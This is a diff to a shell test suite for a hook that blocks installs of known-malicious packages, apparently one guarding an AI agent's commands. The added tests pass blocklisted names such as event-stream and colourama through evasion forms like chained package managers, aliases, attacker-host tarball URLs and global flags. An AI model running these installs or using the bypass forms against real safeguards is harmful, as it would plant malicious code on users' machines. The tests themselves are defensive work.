@@ -122,6 +122,36 @@ check deny  "a stray quote inside a name"    "npm install ev'ent-stream"
 check ask   "an unreadable argument beside a readable one"             'npm install lodash pkg$(whoami)'
 
 echo
+echo "more than one package manager on a line"
+# Was allow: the detector took the first PM_PATTERNS key that matched, and because that
+# is an associative array "first" meant bash hash order. `pip install requests && npm
+# install event-stream` was classified python, so the lookup was python:event-stream,
+# which is not an entry, and a known-malicious npm package was installed with approval.
+check deny  "second manager is checked too"  "pip install requests && npm install event-stream"
+check deny  "first manager is checked too"   "npm install event-stream && pip install requests"
+check deny  "separated by a semicolon"       "pip install requests; npm install event-stream"
+
+echo
+echo "install forms that are not a bare name"
+# Was allow: clean_pkg cut at the @ and handed the blocklist the alias.
+check deny  "npm alias resolves to the real package" "npm install safe-name@npm:event-stream"
+# Was allow: clean_pkg's composer `vendor:` strip cut every URL down to its scheme, so
+# the blocklist was asked about the string "https".
+check ask   "a tarball URL is unverifiable, not clean"             "npm install https://evil.example/event-stream.tgz"
+check ask   "a git ref is unverifiable too"             "pip install git+https://github.com/attacker/colourama"
+check allow "composer vendor:package still reads"  "composer require monolog/monolog"
+
+echo
+echo "a global flag before the subcommand"
+# Was allow: every pattern required the subcommand to touch the program name, so
+# `npm --prefix . install x` matched nothing and was waved through unexamined.
+check deny  "npm with a global flag"         "npm --prefix . install event-stream"
+check deny  "pip with a global flag"         "pip --quiet install colourama"
+check deny  "yarn with a global flag"        "yarn --cwd ./x add event-stream"
+check allow "a non-install subcommand"       "npm run build"
+check allow "a bare query flag"              "npm --version"
+
+echo
 echo "the detector over-matches on purpose"
 # `npm install` inside a string is read as an install. That is deliberate and it is
 # not new: the detector cannot tell `git commit -m "npm install fix"` from
@@ -131,6 +161,31 @@ echo "the detector over-matches on purpose"
 # quietly and a sentence naming a blocklisted package does not.
 check allow "an install mentioned inside a string"             "echo 'run npm install later'"
 check deny  "...and a blocklisted name in one still denies"             "echo 'run npm install event-stream later'"
+
+echo
+echo "the blocklist is not capped"
+# `head -20` used to truncate before any check ran, so a blocklisted package in 21st
+# position came back as a nameless "ask" rather than a deny that says which name.
+MANY=""
+i=1
+while [ "$i" -le 25 ]; do MANY="$MANY safe-pkg-$i"; i=$((i + 1)); done
+check deny  "a blocklisted name in 26th position" "npm install$MANY event-stream"
+
+echo
+echo "no JSON parser is declared, not hidden"
+# get_json_field called python3 by name and swallowed its stderr, so on a host without
+# a working one CMD came back empty, that read as "not an install", and every install
+# of every blocklisted package was approved in silence.
+NOPARSE="$(PATH=/usr/bin:/bin "$PY3" -c 'import json,sys;print(json.dumps({"tool_input":{"command":"npm install event-stream"}}))' 2>/dev/null   | PATH=/usr/bin:/bin bash "$HOOK" 2>/dev/null)"
+case "$NOPARSE" in
+  *permissionDecisionReason*python3*jq*)
+    printf '  ok    %-5s  %s
+' "says" "a missing parser is reported, not silent" ;;
+  *)
+    printf '  FAIL  no reason given when no JSON parser exists -- %s
+' "${NOPARSE:-<empty>}"
+    FAILURES=$((FAILURES + 1)) ;;
+esac
 
 echo
 if [ "$FAILURES" -gt 0 ]; then
